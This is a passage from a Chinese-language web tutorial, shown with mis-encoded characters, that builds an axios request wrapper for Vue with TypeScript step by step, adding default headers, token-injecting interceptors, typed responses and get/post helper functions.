<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šä»…åˆ›å»ºaxioså®ä¾‹ + å›ºå®šé»˜è®¤è¯·æ±‚å¤´</span>
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>;

<span class="hljs-comment">// 1. åˆ›å»ºaxioså®ä¾‹ï¼Œé…ç½®åŸºç¡€è¯·æ±‚å¤´</span>
<span class="hljs-keyword">const</span> request = axios.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'http://localhost:3000/api'</span>, <span class="hljs-comment">// æ¥å£åŸºç¡€åœ°å€ï¼ˆä¸´æ—¶å†™æ­»ï¼‰</span>
  <span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>, <span class="hljs-comment">// è¯·æ±‚è¶…æ—¶æ—¶é—´</span>
  <span class="hljs-comment">// æ ¸å¿ƒï¼šé»˜è®¤è¯·æ±‚å¤´é…ç½®ï¼ˆæ‰€æœ‰è¯·æ±‚éƒ½ä¼šæºå¸¦ï¼‰</span>
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json;charset=utf-8'</span>, <span class="hljs-comment">// é»˜è®¤JSONæ ¼å¼</span>
    <span class="hljs-string">'X-Platform'</span>: <span class="hljs-string">'web'</span> <span class="hljs-comment">// è‡ªå®šä¹‰å›ºå®šè¯·æ±‚å¤´ï¼ˆå¦‚å¹³å°æ ‡è¯†ï¼‰</span>
  }
});

<span class="hljs-comment">// å¯¼å‡ºå®ä¾‹ï¼Œç›´æ¥ä½¿ç”¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> request;
</code></pre>
<h4 data-id="heading-3">1.3 ç»„ä»¶ä¸­ç®€å•ä½¿ç”¨</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> request <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/request'</span>;

<span class="hljs-comment">// å‘èµ·è¯·æ±‚ï¼ˆè‡ªåŠ¨æºå¸¦é»˜è®¤è¯·æ±‚å¤´ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/user/list'</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
  }
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-4">1.4 å…³é”®è§£é‡Š</h4>
<ul>
<li><code>axios.create()</code>ï¼šåˆ›å»ºç‹¬ç«‹çš„ axios å®ä¾‹ï¼Œé¿å…æ±¡æŸ“å…¨å±€ axios é…ç½®ï¼›</li>
<li><code>headers</code> é…ç½®é¡¹ï¼šè®¾ç½®<strong>æ‰€æœ‰è¯·æ±‚é»˜è®¤æºå¸¦</strong>çš„å›ºå®šè¯·æ±‚å¤´ï¼Œæ¯”å¦‚ <code>Content-Type</code> æ˜¯æœ€å¸¸ç”¨çš„é»˜è®¤å¤´ï¼›</li>
<li>æ­¤ç‰ˆæœ¬ä»…æ»¡è¶³ã€Œå›ºå®šè¯·æ±‚å¤´ã€éœ€æ±‚ï¼Œæ— æ³•åŠ¨æ€ä¿®æ”¹ï¼ˆå¦‚ Tokenï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-5">æ­¥éª¤ 2ï¼šåŸºç¡€å¢å¼º - åŠ¨æ€è¯·æ±‚å¤´ï¼ˆTokenï¼‰+ è¯·æ±‚æ‹¦æˆªå™¨</h3>
<p>è¿™æ˜¯å®é™…é¡¹ç›®ä¸­æœ€æ ¸å¿ƒçš„éœ€æ±‚ï¼š<strong>æ ¹æ®ç™»å½•çŠ¶æ€åŠ¨æ€æ·»åŠ  Token åˆ°è¯·æ±‚å¤´</strong>ï¼Œé€šè¿‡è¯·æ±‚æ‹¦æˆªå™¨å®ç°ã€‚</p>
<h4 data-id="heading-6">2.1 å‡çº§å°è£…ä»£ç ï¼ˆsrc/utils/request.tsï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šæ–°å¢è¯·æ±‚æ‹¦æˆªå™¨ï¼ŒåŠ¨æ€æ·»åŠ Token</span>
<span class="hljs-keyword">import</span> axios, { <span class="hljs-title class_">AxiosRequestConfig</span>, <span class="hljs-title class_">AxiosError</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>;

<span class="hljs-keyword">const</span> request = axios.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'http://localhost:3000/api'</span>,
  <span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json;charset=utf-8'</span>,
    <span class="hljs-string">'X-Platform'</span>: <span class="hljs-string">'web'</span>
  }
});

<span class="hljs-comment">// æ ¸å¿ƒæ–°å¢ï¼šè¯·æ±‚æ‹¦æˆªå™¨ï¼ˆè¯·æ±‚å‘é€å‰æ‰§è¡Œï¼Œç”¨äºä¿®æ”¹è¯·æ±‚å¤´ï¼‰</span>
request.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-comment">// æˆåŠŸå›è°ƒï¼šä¿®æ”¹è¯·æ±‚é…ç½®ï¼ˆé‡ç‚¹æ˜¯headersï¼‰</span>
  <span class="hljs-function">(<span class="hljs-params">config: AxiosRequestConfig</span>) =&gt;</span> {
    <span class="hljs-comment">// 1. ä»æœ¬åœ°å­˜å‚¨è·å–Tokenï¼ˆç™»å½•åå­˜å…¥ï¼‰</span>
    <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'token'</span>);
    <span class="hljs-comment">// 2. å¦‚æœæœ‰Tokenï¼ŒåŠ¨æ€æ·»åŠ åˆ°è¯·æ±‚å¤´ï¼ˆåç«¯å¸¸ç”¨Authorizationå­—æ®µï¼‰</span>
    <span class="hljs-keyword">if</span> (token) {
      <span class="hljs-comment">// æ³¨æ„ï¼šTypeScriptéœ€å…ˆåˆ¤æ–­headerså­˜åœ¨ï¼Œé¿å…ç±»å‹æŠ¥é”™</span>
      config.<span class="hljs-property">headers</span> = config.<span class="hljs-property">headers</span> || {};
      config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>; <span class="hljs-comment">// æŒ‰åç«¯æ ¼å¼æ‹¼æ¥</span>
    }
    <span class="hljs-keyword">return</span> config;
  },
  <span class="hljs-comment">// å¤±è´¥å›è°ƒï¼šæ•è·è¯·æ±‚é…ç½®é”™è¯¯</span>
  <span class="hljs-function">(<span class="hljs-params">error: AxiosError</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è¯·æ±‚å¤´é…ç½®å¤±è´¥ï¼š'</span>, error);
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);
  }
);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> request;
</code></pre>
<h4 data-id="heading-7">2.2 ç»„ä»¶ä½¿ç”¨ï¼ˆç™»å½•åè‡ªåŠ¨æºå¸¦ Tokenï¼‰</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> request <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/request'</span>;

<span class="hljs-comment">// æ¨¡æ‹Ÿç™»å½•ï¼šç™»å½•æˆåŠŸåå­˜å‚¨Token</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">login</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/login'</span>, { <span class="hljs-attr">username</span>: <span class="hljs-string">'test'</span>, <span class="hljs-attr">password</span>: <span class="hljs-string">'123456'</span> });
  <span class="hljs-comment">// å­˜å‚¨Tokenåˆ°æœ¬åœ°</span>
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'token'</span>, res.<span class="hljs-property">data</span>.<span class="hljs-property">token</span>);
};

<span class="hljs-comment">// ç™»å½•åå‘èµ·è¯·æ±‚ï¼šè‡ªåŠ¨æºå¸¦Tokenè¯·æ±‚å¤´</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchUserInfo</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/user/info'</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-8">2.3 å…³é”®è§£é‡Š</h4>
<ul>
<li><code>request.interceptors.request.use()</code>ï¼šè¯·æ±‚æ‹¦æˆªå™¨æ˜¯ã€ŒåŠ¨æ€ä¿®æ”¹è¯·æ±‚å¤´ã€çš„æ ¸å¿ƒï¼Œè¯·æ±‚å‘é€å‰ä¼šæ‰§è¡Œæ­¤å›è°ƒï¼›</li>
<li>Token å¤„ç†é€»è¾‘ï¼šç™»å½•åå°† Token å­˜å…¥ <code>localStorage</code>ï¼Œåç»­æ‰€æœ‰è¯·æ±‚éƒ½ä¼šé€šè¿‡æ‹¦æˆªå™¨è‡ªåŠ¨æ·»åŠ åˆ° <code>Authorization</code> å¤´ï¼›</li>
<li>TypeScript æ³¨æ„ï¼š<code>config.headers</code> å¯èƒ½ä¸º <code>undefined</code>ï¼Œéœ€å…ˆèµ‹å€¼é¿å…ç±»å‹æŠ¥é”™ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-9">æ­¥éª¤ 3ï¼šTS å¼ºåŒ– - ç±»å‹çº¦æŸ + ç»Ÿä¸€å“åº”æ ¼å¼</h3>
<p>åœ¨ Vue + TS é¡¹ç›®ä¸­ï¼Œéœ€è¦å®Œå–„ç±»å‹å®šä¹‰ï¼Œé¿å… <code>any</code> ç±»å‹ï¼Œä¿è¯ä»£ç çš„ç±»å‹å®‰å…¨ã€‚</p>
<h4 data-id="heading-10">3.1 å‡çº§å°è£…ä»£ç ï¼ˆsrc/utils/request.tsï¼‰</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šå®Œå–„TypeScriptç±»å‹çº¦æŸ</span>
<span class="hljs-keyword">import</span> axios, { <span class="hljs-title class_">AxiosInstance</span>, <span class="hljs-title class_">AxiosRequestConfig</span>, <span class="hljs-title class_">AxiosResponse</span>, <span class="hljs-title class_">AxiosError</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>;

<span class="hljs-comment">// æ–°å¢1ï¼šå®šä¹‰æ¥å£è¿”å›æ•°æ®çš„é€šç”¨ç±»å‹ï¼ˆå’Œåç«¯çº¦å®šï¼‰</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ApiResponse</span>&lt;T = <span class="hljs-built_in">any</span>&gt; {
  <span class="hljs-attr">code</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// ä¸šåŠ¡çŠ¶æ€ç ï¼ˆå¦‚200æˆåŠŸï¼Œ401æœªç™»å½•ï¼‰</span>
  <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// æç¤ºä¿¡æ¯</span>
  <span class="hljs-attr">data</span>: T; <span class="hljs-comment">// å®é™…è¿”å›æ•°æ®</span>
}

<span class="hljs-comment">// æ–°å¢2ï¼šæ‰©å±•axiosé…ç½®ç±»å‹ï¼ˆæ”¯æŒè‡ªå®šä¹‰ä¸šåŠ¡é…ç½®ï¼Œæ¯”å¦‚æ˜¯å¦éœ€è¦Tokenï¼‰</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">CustomRequestConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AxiosRequestConfig</span> {
  needToken?: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// è‡ªå®šä¹‰é…ç½®ï¼šæ˜¯å¦éœ€è¦æºå¸¦Tokenï¼ˆé»˜è®¤trueï¼‰</span>
}

<span class="hljs-comment">// åˆ›å»ºå®ä¾‹æ—¶æŒ‡å®šç±»å‹</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">request</span>: <span class="hljs-title class_">AxiosInstance</span> = axios.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'http://localhost:3000/api'</span>,
  <span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json;charset=utf-8'</span>,
    <span class="hljs-string">'X-Platform'</span>: <span class="hljs-string">'web'</span>
  }
});

<span class="hljs-comment">// æ‹¦æˆªå™¨å‡çº§ï¼šä½¿ç”¨è‡ªå®šä¹‰é…ç½®ç±»å‹</span>
request.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">config: CustomRequestConfig</span>) =&gt;</span> {
    <span class="hljs-comment">// æ–°å¢ï¼šæ ¹æ®needTokené…ç½®å†³å®šæ˜¯å¦æºå¸¦Token</span>
    <span class="hljs-keyword">if</span> (config.<span class="hljs-property">needToken</span> !== <span class="hljs-literal">false</span>) {
      <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'token'</span>);
      <span class="hljs-keyword">if</span> (token) {
        config.<span class="hljs-property">headers</span> = config.<span class="hljs-property">headers</span> || {};
        config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>;
      }
    }
    <span class="hljs-keyword">return</span> config;
  },
  <span class="hljs-function">(<span class="hljs-params">error: AxiosError</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);
  }
);

<span class="hljs-comment">// æ–°å¢ï¼šå“åº”æ‹¦æˆªå™¨ï¼ˆç»Ÿä¸€å¤„ç†è¿”å›ç»“æœï¼Œå¼ºåŒ–ç±»å‹ï¼‰</span>
request.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">response: AxiosResponse&lt;ApiResponse&gt;</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> res = response.<span class="hljs-property">data</span>;
    <span class="hljs-comment">// ç»Ÿä¸€ä¸šåŠ¡ç æ ¡éªŒï¼ˆæ¯”å¦‚401æœªç™»å½•ï¼‰</span>
    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">code</span> !== <span class="hljs-number">200</span>) {
      <span class="hljs-keyword">if</span> (res.<span class="hljs-property">code</span> === <span class="hljs-number">401</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Tokenè¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•'</span>);
        <span class="hljs-comment">// å¯åœ¨æ­¤å¤„è·³è½¬ç™»å½•é¡µ</span>
        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'token'</span>);
      }
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(res.<span class="hljs-property">message</span> || <span class="hljs-string">'è¯·æ±‚å¤±è´¥'</span>));
    }
    <span class="hljs-keyword">return</span> res; <span class="hljs-comment">// ç›´æ¥è¿”å›å¤„ç†åçš„dataï¼Œç®€åŒ–ç»„ä»¶ä½¿ç”¨</span>
  },
  <span class="hljs-function">(<span class="hljs-params">error: AxiosError</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è¯·æ±‚å¤±è´¥ï¼š'</span>, error.<span class="hljs-property">message</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);
  }
);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> request;
</code></pre>
<h4 data-id="heading-11">3.2 ç»„ä»¶ä½¿ç”¨ï¼ˆå¸¦ç±»å‹æç¤ºï¼‰</h4>
<pre><code class="hljs language-typescript" lang="typescript">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> request <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/request'</span>;

<span class="hljs-comment">// å®šä¹‰è¿”å›æ•°æ®çš„å…·ä½“ç±»å‹</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserInfo</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// 1. å¸¦Tokençš„è¯·æ±‚ï¼ˆé»˜è®¤ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchUserInfo</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// æ³›å‹æŒ‡å®šè¿”å›æ•°æ®ç±»å‹ï¼Œè·å¾—TSç±»å‹æç¤º</span>
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> request.<span class="hljs-property">get</span>&lt;<span class="hljs-title class_">ApiResponse</span>&lt;<span class="hljs-title class_">UserInfo</span>&gt;&gt;(<span class="hljs-string">'/user/info'</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">data</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// TSä¼šæç¤ºnameå±æ€§</span>
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
  }
};

<span class="hljs-comment">// 2. ä¸éœ€è¦Tokençš„å…¬å¼€æ¥å£ï¼ˆæ‰‹åŠ¨å…³é—­ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchPublicData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/public/data'</span>, {
    <span class="hljs-attr">needToken</span>: <span class="hljs-literal">false</span> <span class="hljs-comment">// è‡ªå®šä¹‰é…ç½®ï¼šä¸æºå¸¦Token</span>
  });
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);
};
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-12">3.3 å…³é”®è§£é‡Š</h4>
<ul>
<li><code>ApiResponse</code>ï¼šç»Ÿä¸€æ¥å£è¿”å›ç±»å‹ï¼Œé¿å…ç»„ä»¶ä¸­ä½¿ç”¨ <code>any</code>ï¼ŒTS ä¼šæç¤º <code>code/message/data</code> å­—æ®µï¼›</li>
<li><code>CustomRequestConfig</code>ï¼šæ‰©å±• axios åŸç”Ÿé…ç½®ï¼Œæ”¯æŒè‡ªå®šä¹‰ä¸šåŠ¡é…ç½®ï¼ˆå¦‚ <code>needToken</code>ï¼‰ï¼Œçµæ´»æ§åˆ¶æ˜¯å¦æºå¸¦ Tokenï¼›</li>
<li>å“åº”æ‹¦æˆªå™¨ï¼šç»Ÿä¸€å¤„ç†ä¸šåŠ¡ç ï¼ˆå¦‚ 401 Token è¿‡æœŸï¼‰ï¼Œç®€åŒ–ç»„ä»¶ä¸­çš„é”™è¯¯å¤„ç†ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-13">æ­¥éª¤ 4ï¼šæ˜“ç”¨æ€§æå‡ - å°è£…é€šç”¨è¯·æ±‚æ–¹æ³•</h3>
<p>å°è£… <code>get/post</code> ç­‰é€šç”¨æ–¹æ³•ï¼Œç®€åŒ–ç»„ä»¶è°ƒç”¨ï¼Œè¿›ä¸€æ­¥å¼ºåŒ– TypeScript æ³›å‹æ”¯æŒã€‚</p>
<h4 data-id="heading-14">4.1 å‡çº§å°è£…ä»£ç ï¼ˆsrc/utils/request.tsï¼‰</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç¬¬å››æ­¥ï¼šå°è£…get/posté€šç”¨æ–¹æ³•ï¼Œç®€åŒ–ä½¿ç”¨</span>
<span class="hljs-keyword">import</span> axios, { <span class="hljs-title class_">AxiosInstance</span>, <span class="hljs-title class_">AxiosRequestConfig</span>, <span class="hljs-title class_">AxiosResponse</span>, <span class="hljs-title class_">AxiosError</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>;

<span class="hljs-comment">// å¤ç”¨æ­¥éª¤3çš„ç±»å‹å®šä¹‰</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ApiResponse</span>&lt;T = <span class="hljs-built_in">any</span>&gt; {
  <span class="hljs-attr">code</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">data</span>: T;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">CustomRequestConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AxiosRequestConfig</span> {
  needToken?: <span class="hljs-built_in">boolean</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-attr">request</span>: <span class="hljs-title class_">AxiosInstance</span> = axios.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'http://localhost:3000/api'</span>,
  <span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json;charset=utf-8'</span>,
    <span class="hljs-string">'X-Platform'</span>: <span class="hljs-string">'web'</span>
  }
});

<span class="hljs-comment">// å¤ç”¨æ­¥éª¤3çš„æ‹¦æˆªå™¨é€»è¾‘</span>
request.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">config: CustomRequestConfig</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (config.<span class="hljs-property">needToken</span> !== <span class="hljs-literal">false</span>) {
      <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'token'</span>);
      <span class="hljs-keyword">if</span> (token) {
        config.<span class="hljs-property">headers</span> = config.<span class="hljs-property">headers</span> || {};
        config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>;
      }
    }
    <span class="hljs-keyword">return</span> config;
  },
  <span class="hljs-function">(<span class="hljs-params">error: AxiosError</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)
);

request.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">response: AxiosResponse&lt;ApiResponse&gt;</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> res = response.<span class="hljs-property">data</span>;
    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">code</span> !== <span class="hljs-number">200</span>) {
      <span class="hljs-keyword">if</span> (res.<span class="hljs-property">code</span> === <span class="hljs-number">401</span>) {
        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'token'</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è¯·é‡æ–°ç™»å½•'</span>);
      }
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(res.<span class="hljs-property">message</span>));
    }
    <span class="hljs-keyword">return</span> res;
  },
  <span class="hljs-function">(<span class="hljs-params">error: AxiosError</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)
);

<span class="hljs-comment">// æ ¸å¿ƒæ–°å¢ï¼šå°è£…é€šç”¨GETæ–¹æ³•</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> get = &lt;T = <span class="hljs-built_in">any</span>&gt;(
  <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>,
  params?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;, <span class="hljs-comment">// URLå‚æ•°ç±»å‹</span>
  config?: <span class="hljs-title class_">CustomRequestConfig</span> <span class="hljs-comment">// è‡ªå®šä¹‰é…ç½®</span>
): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ApiResponse</span>&lt;T&gt;&gt; =&gt; {
  <span class="hljs-keyword">return</span> request.<span class="hljs-title function_">get</span>(url, { params, ...config });
};

<span class="hljs-comment">// å°è£…é€šç”¨POSTæ–¹æ³•</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> post = &lt;T = <span class="hljs-built_in">any</span>&gt;(
  <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>,
  data?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;, <span class="hljs-comment">// è¯·æ±‚ä½“æ•°æ®ç±»å‹</span>
  config?: <span class="hljs-title class_">CustomRequestConfig</span>
): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ApiResponse</span>&lt;T&gt;&gt; =&gt; {
  <span class="hljs-keyword">return</span> request.<span class="hljs-title function_">post</span>(url, data, config);
};

<span class="hljs-comment">// å¯¼å‡ºå°è£…æ–¹æ³•ï¼ˆç»„ä»¶ä¼˜å…ˆç”¨get/postï¼Œè€Œéç›´æ¥ç”¨requestï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> request;
</code></pre>
<h4 data-id="heading-15">4.2 ç»„ä»¶ä½¿ç”¨ï¼ˆæ›´ç®€æ´ï¼‰</h4>
<pre><code class="hljs language-typescript" lang="typescript">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { get, post } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/request'</span>;

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserInfo</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// ä½¿ç”¨å°è£…çš„getæ–¹æ³•ï¼ˆå‚æ•°æ›´æ¸…æ™°ï¼Œæ³›å‹æç¤ºï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchUser</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> get&lt;<span class="hljs-title class_">UserInfo</span>&gt;(<span class="hljs-string">'/user/info'</span>, { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span> });
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">data</span>.<span class="hljs-property">name</span>);
};

<span class="hljs-comment">// ä½¿ç”¨å°è£…çš„postæ–¹æ³•</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">submitForm</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> post&lt;{ <span class="hljs-attr">success</span>: <span class="hljs-built_in">boolean</span> }&gt;(<span class="hljs-string">'/user/save'</span>, { <span class="hljs-attr">name</span>: <span class="hljs-string">'å¼ ä¸‰'</span> });
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">data</span>.<span class="hljs-property">success</span>);
};
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-16">4.3 å…³é”®è§£é‡Š</h4>
<ul>
